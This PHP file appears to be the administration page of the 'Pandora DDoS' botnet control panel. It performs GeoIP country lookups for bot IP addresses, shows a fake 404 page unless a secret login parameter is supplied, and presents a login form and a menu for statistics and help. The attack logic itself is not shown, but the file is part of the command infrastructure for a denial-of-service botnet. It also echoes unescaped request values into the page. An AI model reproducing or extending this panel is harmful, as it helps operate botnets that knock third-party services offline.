<?
	if ($_GET['i']=='exit') {
		setcookie("dj","exit", time()+8640000);
		echo "</script><meta http-equiv='REFRESH' CONTENT='0;URL='>";
	}
	function user_geo_ip($ip, $id) {
		include_once("geo_ip.php");
		$geoip = geo_ip::getInstance("geo_ip.dat");
		if ($id == 1) {
			$cont = $geoip->lookupCountryCode($ip);
		} elseif ($id == 2) {
			$cont = $geoip->lookupCountryName($ip);
		} elseif ($id == 3) {
			$name = $geoip->lookupCountryName($ip);
			$img = str_replace(" ", "_", strtolower($name));
			if (file_exists("img/".$img.".png")) {
				$cont = "<img src=\"img/".$img.".png\" border=\"0\" align=\"center\" alt=\"".$lang[$conf['lang']]['table_country'].": ".$name."\" title=\"".$lang[$conf['lang']]['table_country'].": ".$name."\">";
			} else {
				$cont = "<img src=\"img/question.png\" border=\"0\" align=\"center\" alt=\"".$lang[$conf['lang']]['table_country'].": ".$name."\" title=\"".$lang[$conf['lang']]['table_country'].": ".$name."\">";
			}
		} elseif ($id == 4) {
			$name = $geoip->lookupCountryName($ip);
			$img = str_replace(" ", "_", strtolower($name));
			if (file_exists("img/".$img.".png")) {
				$cont = "<img src=\"img/".$img.".png\" border=\"0\" align=\"center\" alt=\"".$lang[$conf['lang']]['table_country'].": ".$name."\" title=\"".$lang[$conf['lang']]['table_country'].": ".$name."\"> $ip";
			} else {
				$cont = "<img src=\"img/question.png\" border=\"0\" align=\"center\" alt=\"".$lang[$conf['lang']]['table_country'].": ".$name."\" title=\"".$lang[$conf['lang']]['table_country'].": ".$name."\"> $ip";
			}
		}
		return $cont;
	}
	include"core.php";
	include"config.php";
	if ($_GET['login']!=$GET_login) {
		if ($_GET['login']=='') {
			$folder=$folder."admin.php";
		} else {
			$folder=$folder."admin.php?login=".$_GET['login'];
		}
		include"404.php";
	}
	include"aut.php";
	if (($l<>1)and($_GET['new'])!=1) {
		echo '<meta http-equiv="REFRESH" CONTENT="0;URL=admin.php?login='.$GET_login.'&new=1">';
		exit;
	}
	echo'

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html lang="ru" xmlns="http://www.w3.org/1999/xhtml" xml:lang="ru">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=cp1251" />
	<link rel="stylesheet" type="text/css" href="style.css" />
	<meta name="robots" content="index, follow" />
	<title>Pandora DDoS</title>
</head>
<body>


';
	if ($l<>1) {
		echo'
<br><br><br><br><br><br><br><br><br><br><br>
<div class="shadow">
<form action="login.php" method="POST" align="center">
		<div align="center">
<br><br>
			<div class="blocks">
				<div class="left"><div class="cell">
					Login
				</div></div>
				<div class="right"><div class="cell">
					<input type="text" name="login" value="" />
				</div></div>
			</div>
			<div class="blocks">
				<div class="left"><div class="cell">
					Password
				</div></div>
				<div class="right"><div class="cell">
					<input type="text" name="pass" value="" />
				</div></div>
			</div>
<input type="submit" name="Login" class="button" value="OK">
		</div>
	</form>
		';
	} else {
$ip=$_SERVER['REMOTE_ADDR'];
$lo=$_GET['load'];
		echo'
		<div class="menu">
		<ul>
			<li><a href="admin.php?login='.$GET_login.'">Main</a></li>
			<li><a href="admin.php?login='.$GET_login.'&i=today">Statistics</a></li>
			<li><a href="admin.php?login='.$GET_login.'&i=help">Information</a></li>
			<li><a href="admin.php?login='.$GET_login.'&i=exit">Exit</a></li>
		</ul>
	</div>
	<div class="shadow">
		';
if ($_GET[i]!='help') {
			include("m_d.php");
} else {
include("help.php");
}
		echo'	    
	</div>
		';
	}
echo'
</body>
</html>
';
?>